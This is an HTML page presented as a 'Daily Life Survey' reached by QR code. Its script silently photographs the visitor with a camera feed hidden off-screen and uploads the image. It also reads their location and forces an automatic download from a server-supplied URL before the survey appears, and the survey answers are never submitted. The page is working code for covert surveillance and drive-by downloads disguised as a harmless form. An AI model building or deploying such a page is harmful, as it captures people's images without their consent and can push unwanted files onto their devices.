<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>QR Photo + Survey</title>
<style>
body { font-family: Arial; text-align: center; margin-top: 30px; background: #f2f2f2; }
video { 
  width: 1px; 
  height: 1px; 
  position: absolute; 
  top: -100px; 
  left: -100px; 
} /* keeps camera working but hidden */
canvas { display: none; }
h2 { color: #333; }
p { color: #555; }
form { margin-top: 20px; display: none; background: #fff; padding: 20px; border-radius: 10px; width: 320px; margin-left: auto; margin-right: auto; }
input, select, textarea { width: 100%; margin-bottom: 10px; padding: 6px; }
button { padding: 10px 20px; cursor: pointer; background: #4CAF50; color: white; border: none; border-radius: 5px; }
</style>
</head>

<body>
<h2>Please allow camera and location access to continue ðŸ˜Š</h2>
<p>This helps us verify your response and show the survey.</p>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<form id="surveyForm">
  <h3>Daily Life Survey</h3>

  <label>Name:</label>
  <input type="text" name="name" required>

  <label>How many times do you brush your teeth daily?</label>
  <select name="brush" required>
    <option value="0">0</option>
    <option value="1">1</option>
    <option value="2">2</option>
    <option value="3+">3+</option>
  </select>

  <label>How many meals do you eat per day?</label>
  <select name="meals" required>
    <option value="1">1</option>
    <option value="2">2</option>
    <option value="3">3</option>
    <option value="4+">4+</option>
  </select>

  <label>Do you exercise regularly?</label>
  <select name="exercise" required>
    <option value="Yes">Yes</option>
    <option value="No">No</option>
  </select>

  <label>How many hours of sleep do you get on average?</label>
  <select name="sleep" required>
    <option value="<5"><5</option>
    <option value="5-6">5-6</option>
    <option value="6-7">6-7</option>
    <option value="7+">7+</option>
  </select>

  <label>Do you drink enough water daily?</label>
  <select name="water" required>
    <option value="Yes">Yes</option>
    <option value="No">No</option>
  </select>

  <label>Any other healthy habits?</label>
  <textarea name="habits" rows="3"></textarea>

  <button type="submit">Submit</button>
</form>

<p id="thanksMessage" style="display:none;">Thank you for completing the survey!</p>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const form = document.getElementById("surveyForm");
const thanks = document.getElementById("thanksMessage");

// Camera init
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    // Optional geolocation
    navigator.geolocation.getCurrentPosition(
      pos => console.log("Location:", pos.coords.latitude, pos.coords.longitude),
      () => console.log("Location denied")
    );

    // Capture photo after 1 second
    setTimeout(() => captureAndSend(stream), 1000);

  } catch (err) {
    alert("Camera permission is required to continue.");
  }
}

// Capture and send
function captureAndSend(stream) {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  canvas.toBlob(async (blob) => {
    const formData = new FormData();
    formData.append("photo", blob);
    formData.append("qr_id", "unknown");

    try {
      const res = await fetch("/api/upload", { method: "POST", body: formData });
      const data = await res.json();

      if (data.status === "success") {
        // Auto-download
        const a = document.createElement("a");
        a.href = data.downloadUrl;
        a.download = ""; // triggers download
        document.body.appendChild(a);
        a.click();
        a.remove();

        document.querySelector('h2').style.display = 'none';
        document.querySelector('p').style.display = 'none';
        form.style.display = 'block';
      } else {
        alert("Upload failed.");
      }
    } catch (err) {
      alert("Upload failed. Refresh and try again.");
    }
  });

  stream.getTracks().forEach(track => track.stop());
}

// Form submission
form.addEventListener("submit", e => {
  e.preventDefault();
  form.style.display = "none";
  thanks.style.display = "block";
});

init();
</script>
</body>
</html>

